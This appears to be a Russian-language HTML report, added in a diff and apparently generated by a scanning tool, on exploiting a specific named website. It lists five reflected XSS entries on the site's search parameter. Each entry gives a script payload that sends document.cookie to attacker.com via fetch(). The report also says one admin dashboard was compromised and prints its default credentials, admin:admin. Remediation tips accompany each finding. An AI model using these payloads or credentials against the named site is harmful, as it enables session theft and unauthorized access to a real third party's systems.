@@ -1,0 +1,242 @@
+
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Отчет об эксплуатации уязвимостей</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; line-height: 1.6; }
+            .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+            h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+            h2 { color: #2c3e50; margin-top: 30px; }
+            h3 { color: #2c3e50; }
+            .vulnerability { background: #f9f9f9; border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .vuln-details { margin-left: 20px; }
+            .payload { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }
+            .extracted-data { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; max-height: 200px; overflow-y: auto; }
+            .admin-panel { background: #f9f9f9; border-left: 4px solid #f39c12; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .admin-compromised { border-left: 4px solid #e74c3c; }
+            .stats { background: #f9f9f9; border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .footer { margin-top: 30px; font-size: 0.8em; color: #7f8c8d; text-align: center; }
+            .credentials { background: #e74c3c; color: white; padding: 5px 8px; border-radius: 4px; font-family: monospace; }
+            .method { display: inline-block; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
+            .get { background: #3498db; color: white; }
+            .post { background: #2ecc71; color: white; }
+            .rec-box { background: #fff8e1; border-left: 4px solid #ffc107; padding: 10px; margin: 10px 0; border-radius: 4px; }
+            .technique-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 10px; margin: 10px 0; border-radius: 4px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🔍 ДЕТАЛЬНЫЙ ОТЧЕТ ОБ ЭКСПЛУАТАЦИИ УЯЗВИМОСТЕЙ</h1>
+    
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #1</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://khv.rpa-mu.ru/Search</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=HdsTZwAg&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> HdsTZwAg</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #2</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://khv.rpa-mu.ru/Search</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=CTmZ8X9t&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> CTmZ8X9t</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #3</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://khv.rpa-mu.ru/Search</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=vdIzNZxo&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> vdIzNZxo</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #4</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://khv.rpa-mu.ru/Search</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=luP9UgMu&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> luP9UgMu</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #5</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://khv.rpa-mu.ru/Search</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;script&gt;fetch("http://attacker.com?track=ScFt9gC5&amp;cookie="+document.cookie)&lt;/script&gt;</pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> ScFt9gC5</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+            <div class="vulnerability">
+                <h2>🔴 ОБНАРУЖЕНЫ АДМИНИСТРАТИВНЫЕ ИНТЕРФЕЙСЫ (2)</h2>
+            
+                <div class="vuln-details">
+                    <p style="color: #e74c3c; font-weight: bold; font-size: 1.2em;">⚠️ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: 1 административных интерфейсов взломаны</p>
+                
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #1</h3>
+                        <p><strong>URL:</strong> https://khv.rpa-mu.ru/admin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> Доступ запрещен</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel admin-compromised">
+                        <h3>🔹 Админ-панель #2</h3>
+                        <p><strong>URL:</strong> https://khv.rpa-mu.ru/admin/dashboard</p>
+                        <p><strong>Статус:</strong> <span style="color: red; font-weight: bold;">ВЗЛОМАНА ⚠️</span></p>
+                        <p><strong>Учетные данные:</strong> <span class="credentials">admin:admin</span></p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Подбор стандартных/слабых паролей</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Немедленно сменить пароль на сложный (минимум 12 символов, буквы, цифры, спецсимволы)</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Использовать защиту от перебора (капча, временная блокировка)</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+            
+    <div class="stats">
+        <h2>📊 СТАТИСТИКА УЯЗВИМОСТЕЙ</h2>
+        <p><strong>Всего уязвимостей:</strong> 7</p>
+    <p><strong>XSS-уязвимости:</strong> 5</p>
+<p><strong>Админ-панели:</strong> 2</p>
+
+    </div>
+    
+            <div class="footer">
+                <p>Отчет сгенерирован: 2025-05-26 19:44:23</p>
+            </div>
+        </div>
+    </body>
+    </html>
+    
